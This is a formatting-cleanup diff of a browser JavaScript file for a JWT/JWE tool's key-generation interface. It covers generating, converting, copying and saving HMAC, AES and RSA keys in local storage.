@@ -4419,7 +4378,7 @@ function setConversionDirectionInKeyGenerationView(element, direction) {
         pemSection.style.display = 'none';
         jwkSection.style.display = 'block';
     }
-    
+
     // Clear outputs
     document.getElementById('conversionOutput').value = '';
     document.getElementById('conversionError').innerText = '';
@@ -4433,12 +4392,12 @@ function updateKeyGenOptionsInKeyGenerationView() {
     const rsaOptions = document.getElementById('rsaOptions');
     const hmacOptions = document.getElementById('hmacOptions');
     const aesOptions = document.getElementById('aesOptions');
-    
+
     // Hide all options first
     rsaOptions.style.display = 'none';
     hmacOptions.style.display = 'none';
     aesOptions.style.display = 'none';
-    
+
     if (algorithm.startsWith('RS') || algorithm.startsWith('PS') || algorithm.startsWith('RSA-OAEP')) {
         rsaOptions.style.display = 'block';
     } else if (algorithm.startsWith('HS')) {
@@ -4455,39 +4414,39 @@ async function generateKeyInKeyGenerationUI() {
     const algorithm = document.getElementById('keyAlgorithm').value;
     const symResult = document.getElementById('symmetricKeyResult');
     const asymResult = document.getElementById('asymmetricKeyResult');
-    
-    // clear all 
+
+    // clear all
     document.getElementById('generatedSymKey').value = '';
     document.getElementById('generatedPrivateKey').value = '';
     document.getElementById('generatedPublicKey').value = '';
     document.getElementById('generatedPrivateJWK').value = '';
     document.getElementById('generatedPublicJWK').value = '';
-    
+
     try {
         if (algorithm.startsWith('HS')) {
             // Generate HMAC key
             const length = parseInt(document.getElementById('hmacKeyLength').value);
             const asHex = document.getElementById('hmacAsHex').checked;
-            const key = generateHMACKey(length,!(document.getElementById('hmacAsHex').checked));
-            
+            const key = generateHMACKey(length, !(document.getElementById('hmacAsHex').checked));
+
             document.getElementById('generatedSymKey').value = key;
             symResult.style.display = 'block';
             asymResult.style.display = 'none';
-            
+
         } else if (algorithm.startsWith('A')) {
             // Generate AES key
             const keyLength = _jwe_algorithm_to_key_length[algorithm];
             const asBase64 = document.getElementById('aesAsBase64').checked;
             const key = generateKeyEncryptionKey(algorithm, asBase64);
-            
+
             document.getElementById('generatedSymKey').value = key;
             symResult.style.display = 'block';
             asymResult.style.display = 'none';
-            
+
         } else {
             // Generate asymmetric key pair
             let keyPair;
-            
+
             if (algorithm.startsWith('RS') || algorithm.startsWith('PS')) {
                 const keySize = parseInt(document.getElementById('rsaKeySize').value);
                 if (algorithm.startsWith('PS')) {
@@ -4501,28 +4460,28 @@ async function generateKeyInKeyGenerationUI() {
             } else if (algorithm.startsWith('RSA-OAEP')) {
                 keyPair = await generateRSA_OAEP(algorithm);
             }
-            
+
             if (keyPair) {
                 document.getElementById('generatedPrivateKey').value = keyPair[0];
                 document.getElementById('generatedPublicKey').value = keyPair[1];
-                
+
                 // Convert to JWK
                 const privateJWK = await pemToJwk(keyPair[0], algorithm);
                 const publicJWK = await pemToJwk(keyPair[1], algorithm);
-                
+
                 document.getElementById('generatedPrivateJWK').value = JSON.stringify(privateJWK, null, 2);
                 document.getElementById('generatedPublicJWK').value = JSON.stringify(publicJWK, null, 2);
-                
+
                 symResult.style.display = 'none';
                 asymResult.style.display = 'block';
             }
         }
-        
+
         // Auto-save if enabled
         if (document.getElementById('autoSaveKeys').checked) {
             saveCurrentKeysToStorage();
         }
-        
+
     } catch (error) {
         console.error('Key generation failed:', error);
     }
@@ -4530,40 +4489,40 @@ async function generateKeyInKeyGenerationUI() {
 
 /**
  * Converts between PEM and JWK formats.
- * Used in the Key Generation UI for key conversion.	
+ * Used in the Key Generation UI for key conversion.
  */
 async function convertKeyInKeyGenerationUI() {
     const direction = document.getElementById('conversionDirection').value;
     const output = document.getElementById('conversionOutput');
     const errorDiv = document.getElementById('conversionError');
-    
+
     try {
         errorDiv.innerText = '';
-        
+
         if (direction === 'pem-to-jwk') {
             const pemInput = document.getElementById('pemInput').value.trim();
             const algorithm = document.getElementById('jwkAlgorithm').value;
-            
+
             if (!pemInput) {
                 throw new Error('Please enter a PEM key');
             }
-            
+
             const jwk = await pemToJwk(pemInput, algorithm);
             output.value = JSON.stringify(jwk, null, 2);
-            
+
         } else {
             const jwkInput = document.getElementById('jwkInput').value.trim();
-            
+
             if (!jwkInput) {
                 throw new Error('Please enter a JWK');
             }
-            
+
             const jwk = JSON.parse(jwkInput);
             const algorithm = jwk.alg || 'RS256'; // Default algorithm
             const pem = await jwkToSpkiPem(jwk, algorithm);
             output.value = pem;
         }
-        
+
     } catch (error) {
         console.error('Key conversion failed:', error);
         errorDiv.innerText = 'Conversion failed: ' + error.message;
@@ -4575,12 +4534,12 @@ async function convertKeyInKeyGenerationUI() {
  * Copies text from textarea to clipboard.
  * Used in the Key Generation UI to copy generated keys.
  * @param {string} elementId - The ID of the textarea element.
- * 
+ *
  */
 async function copyKeyToClipboardFromKeyGenerationUI(elementId) {
     const element = document.getElementById(elementId);
     const text = element.value;
-    
+
     await navigator.clipboard.writeText(text);
     // Visual feedback
     const originalBg = element.style.backgroundColor;
@@ -4588,7 +4547,7 @@ async function copyKeyToClipboardFromKeyGenerationUI(elementId) {
     setTimeout(() => {
         element.style.backgroundColor = originalBg;
     }, 500);
-    
+
 }
 
 /**
@@ -4610,7 +4569,7 @@ function saveCurrentKeysToStorageInKeyGenerationView() {
         algorithm: algorithm,
         timestamp: new Date().toISOString()
     };
-    
+
     if (algorithm.startsWith('HS') || algorithm.startsWith('A')) {
         // symmetric
         keys.symmetric = document.getElementById('generatedSymKey').value;
@@ -4621,7 +4580,7 @@ function saveCurrentKeysToStorageInKeyGenerationView() {
         keys.privateKeyJWK = document.getElementById('generatedPrivateJWK').value;
         keys.publicKeyJWK = document.getElementById('generatedPublicJWK').value;
     }
-    
+
     // Save if one key is present
     if (keys.symmetric || keys.privateKeyPEM) {
         const storedKeys = JSON.parse(localStorage.getItem('savedKeys') || '[]');
@@ -4644,7 +4603,7 @@ function loadKeysFromStorageInKeyGenerationView() {
         console.error('No saved keys found.');
         return;
     }
-    
+
     // Load the most recent key set
     const mostRecent = storedKeys[storedKeys.length - 1];
     loadKeySetInKeyGenerationView(mostRecent);
@@ -4653,12 +4612,12 @@ function loadKeysFromStorageInKeyGenerationView() {
 /**
  * Loads a specific key set.
  * Used in the Key Generation UI to populate fields with saved keys.
- * 
+ *
  */
 function loadKeySetInKeyGenerationView(keySet) {
     document.getElementById('keyAlgorithm').value = DOMPurify.sanitize(keySet.algorithm.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
     updateKeyGenOptionsInKeyGenerationView();
-    
+
     if (keySet.symmetric) {
         document.getElementById('generatedSymKey').value = DOMPurify.sanitize(keySet.symmetric.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
         document.getElementById('symmetricKeyResult').style.display = 'block';
@@ -4675,7 +4634,7 @@ function loadKeySetInKeyGenerationView(keySet) {
 
 /**
  * Clears all stored keys.
- * Used in the Key Generation UI to delete all saved keys from local storage. 
+ * Used in the Key Generation UI to delete all saved keys from local storage.
  * */
 function clearStoredKeysInKeyGenerationView() {
     if (confirm('Are you sure you want to delete all saved keys? This cannot be undone.')) {
@@ -4692,19 +4651,19 @@ function clearStoredKeysInKeyGenerationView() {
 function updateStoredKeysListInKeyGenerationView() {
     const container = document.getElementById('storedKeysList');
     const storedKeys = JSON.parse(localStorage.getItem('savedKeys') || '[]');
-    
+
     if (storedKeys.length === 0) {
         container.innerHTML = '<p>No saved keys found.</p>';
         return;
     }
-    
+
     container.innerHTML = storedKeys.map((keySet, index) => `
         <div class="stored-key-item">
             <div class="stored-key-info">
                 <strong>${keySet.algorithm}</strong> - ${new Date(keySet.timestamp).toLocaleString()}
             </div>
             <div class="stored-key-actions">
-                <button onclick="loadKeySetInKeyGenerationView(${JSON.stringify(keySet).replace(/"/g, '&quot;').replace(/\)/g,'&rpar;')})" class="load-btn">Load</button>
+                <button onclick="loadKeySetInKeyGenerationView(${JSON.stringify(keySet).replace(/"/g, '&quot;').replace(/\)/g, '&rpar;')})" class="load-btn">Load</button>
                 <button onclick="deleteKeySetInKeyGenerationView(${index})" class="clear-btn">Delete</button>
             </div>
         </div>
@@ -4732,7 +4691,7 @@ function autoResize(el) {
     el.style.height = el.scrollHeight + 'px';
 }
 function syncTokenSectionHeight(called_from_JWT_or_JWE = "JWT") {
-    if (called_from_JWT_or_JWE === "JWT"){
+    if (called_from_JWT_or_JWE === "JWT") {
         var tokenSection = document.getElementById('token-section-jwt');
         var decodedSection = document.getElementById('decoded-token-section-jwt');
         if (!tokenSection || !decodedSection) return;
@@ -4762,7 +4721,7 @@ function syncTokenSectionHeight(called_from_JWT_or_JWE = "JWT") {
     decodedSection.style.height = target + 'px';
 }
 
-document.addEventListener("DOMContentLoaded", async function() {
+document.addEventListener("DOMContentLoaded", async function () {
     /*
     toggleToJWE()
     await new Promise(r => setTimeout(r, 2000));
@@ -4776,24 +4735,17 @@ document.addEventListener("DOMContentLoaded", async function() {
     syncTokenSectionHeight();
     // Auto-resize textareas (grow and shrink) and keep columns equal-height
 
-
-document.querySelectorAll('textarea').forEach(textarea => {
-    // Initialize once on load
-    autoResize(textarea);
-    textarea.addEventListener('input', () => {
+    document.querySelectorAll('textarea').forEach(textarea => {
+        // Initialize once on load
         autoResize(textarea);
-        // Let layout update, then sync sections
-        
+        textarea.addEventListener('input', () => {
+            autoResize(textarea);
+            // Let layout update, then sync sections
+        });
     });
 
-
-});
-
-
-
-
     // toggleToJWE();
-    
+
     // document.getElementById('decodedBodyJWE').value = "Live long and prosper."
     // document.getElementById('keyJWE').value = "Possibly-Instructive-Puzzle"
     // document.getElementById('saltJWE').value = "pqzhhrQ0pijlQ7FitRO1NA"
@@ -4814,4 +4766,4 @@ document.querySelectorAll('textarea').forEach(textarea => {
 
 });
 window.verifySignature = verifySignature;
-window.decrypt = decrypt; 
+window.decrypt = decrypt;
